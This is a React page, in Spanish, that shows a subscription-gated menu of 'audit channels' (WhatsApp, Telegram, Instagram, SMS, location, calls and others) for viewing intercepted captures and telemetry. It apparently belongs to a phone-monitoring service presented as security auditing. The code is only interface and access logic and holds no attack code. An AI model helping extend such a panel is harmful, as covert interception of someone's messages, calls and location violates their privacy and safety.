import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuthStore } from '../store';
import { API_BASE_URL } from '../config';
import '../styles/seleccion.css';

const APPS = [
  { name: 'WhatsApp', path: '/whatsapp', img: 'https://cdn-icons-png.flaticon.com/512/3670/3670051.png' },
  { name: 'TikTok', path: '/tiktok', img: 'https://cdn-icons-png.flaticon.com/512/3046/3046121.png' },
  { name: 'Telegram', path: '/telegram', img: 'https://cdn-icons-png.flaticon.com/512/2111/2111646.png' },
  { name: 'Facebook', path: '/facebook', img: 'https://cdn-icons-png.flaticon.com/512/5968/5968764.png' },
  { name: 'Instagram', path: '/instagram', img: 'https://cdn-icons-png.flaticon.com/512/2111/2111463.png' },
  { name: 'Google', path: '/google', img: 'https://cdn-icons-png.flaticon.com/512/281/281764.png' },
  { name: 'SMS', path: '/sms', img: 'https://cdn-icons-png.flaticon.com/512/2875/2875323.png' },
  { name: 'Ubicación', path: '/ubicacion', img: 'https://cdn-icons-png.flaticon.com/512/854/854878.png' },
  { name: 'Llamadas', path: '/llamadas', img: 'https://cdn-icons-png.flaticon.com/512/724/724664.png' },
];

function updateStatusTime() {
  const el = document.getElementById('statusTime');
  if (!el) return;
  const now = new Date();
  el.textContent = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
}

export default function SeleccionPage() {
  const navigate = useNavigate();
  const isNavigatingRef = useRef(false);
  const role = useAuthStore(s => s.role);
  const token = useAuthStore(s => s.token);
  const deviceId = useAuthStore(s => s.deviceId);
  const logout = useAuthStore(s => s.logout);
  // Fail-closed: mientras no se confirmo la suscripcion (o si la
  // verificacion fallo por red/backend), no se considera permitido ningun
  // canal. Antes, mientras cargaba (o si /api/subscriptions fallaba y
  // nunca volvia a intentarse) TODAS las tarjetas quedaban desbloqueadas.
  const [allowedApps, setAllowedApps] = useState<Set<string>>(new Set());
  const [subsChecked, setSubsChecked] = useState(false);

  useEffect(() => {
    if (role === 'admin') {
      setSubsChecked(true);
      return;
    }
    if (!token) {
      setSubsChecked(true);
      return;
    }
    fetch(`${API_BASE_URL}/api/subscriptions`, {
      headers: { 'X-Session-Token': token },
    })
      .then(r => r.json())
      .then(data => {
        const active = new Set<string>();
        for (const sub of data?.subscriptions || []) {
          if (sub.active) active.add(sub.app_name);
        }
        setAllowedApps(active);
      })
      .catch(() => setAllowedApps(new Set()))
      .finally(() => setSubsChecked(true));
  }, [role, token]);

  const isAllowed = (appName: string) => {
    if (role === 'admin') return true;
    if (!subsChecked) return false;
    const map: Record<string, string> = {
      whatsapp: 'whatsapp', tiktok: 'tiktok', telegram: 'telegram',
      facebook: 'facebook', instagram: 'instagram', google: 'google',
      sms: 'sms', ubicación: 'location', ubicacion: 'location',
      llamadas: 'call',
    };
    const key = map[appName.toLowerCase()];
    return allowedApps.has(key);
  };

  const nav = (path: string) => {
    if (isNavigatingRef.current) return;
    isNavigatingRef.current = true;
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;z-index:999;background:#0a0014;opacity:0;transition:opacity 0.2s ease;pointer-events:none';
    document.body.appendChild(overlay);
    requestAnimationFrame(() => overlay.style.opacity = '1');
    setTimeout(() => {
      navigate(path);
      setTimeout(() => {
        overlay.style.opacity = '0';
        setTimeout(() => {
          overlay.remove();
          isNavigatingRef.current = false;
        }, 200);
      }, 50);
    }, 150);
  };

  useEffect(() => {
    updateStatusTime();
    const interval = setInterval(updateStatusTime, 10000);
    if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
    window.scrollTo(0, 0);
    return () => clearInterval(interval);
  }, []);

  return (
    <>
      <div className="status-bar">
        <span className="time" id="statusTime">9:41</span>
        <div className="status-icons">
          <span>●●●●○</span>
          <button onClick={() => { logout(); window.location.href = '/login'; }} className="logout-btn" title="Cerrar sesión">🚪</button>
        </div>
      </div>

      <div className="main-content anim-stagger">
        <div className="badge">🛡 Módulo RASP Activo</div>

        <h1>Seleccione Canal<br />de Auditoría</h1>
        <p className="subtitle">Supervise en tiempo real la telemetría, capturas y eventos de seguridad interceptados.</p>

        <div className="hero-card" data-testid="hero-card-dashboard" onClick={() => nav('/dashboard')}>
          <div className="hero-glow"></div>
          <span className="hero-icon">👁️‍🗨️</span>
          <div className="hero-title">Central de Operaciones Inteligentes</div>
          <div className="hero-desc">Panel general de control, vista unificada y registros en vivo de todos los canales.</div>
          <div className="hero-status">
            <span className="dot"></span>
            Sistema Primario Online
          </div>
        </div>

        <div className="section-label">Canales de auditoría</div>

        <div className="apps-grid">
          {APPS.map(app => {
            const allowed = isAllowed(app.name);
            return (
              <div key={app.name} className={`app-card${!allowed ? ' app-card--locked' : ''}`} onClick={() => allowed && nav(app.path)}>
                <div className="card-glow"></div>
                <div className="icon-wrap">
                  <img src={app.img} alt={app.name} />
                  {!allowed && <span className="lock-icon">🔒</span>}
                </div>
                <h3>{app.name}</h3>
                <span className={`status-badge${!allowed ? ' status-badge--locked' : ''}`}>
                  {allowed ? <><span className="dot-sm"></span> En línea</> : '🔒 Sin acceso'}
                </span>
              </div>
            );
          })}
        </div>
      </div>

      <div className="tab-bar">
        <button className="tab-item active" data-testid="tab-bar-canales" onClick={() => nav('/seleccion')}>
          <span className="tab-icon">🛡</span>
          Canales
        </button>
        {role === 'admin' && (
          <button className="tab-item" data-testid="tab-bar-dashboard" onClick={() => nav('/dashboard')}>
            <span className="tab-icon">👁️</span>
            Dashboard
          </button>
        )}
        {role === 'admin' && (
          <button className="tab-item" data-testid="tab-bar-admin" onClick={() => nav('/admin')}>
            <span className="tab-icon">⚙️</span>
            Admin
          </button>
        )}
      </div>
    </>
  );
}
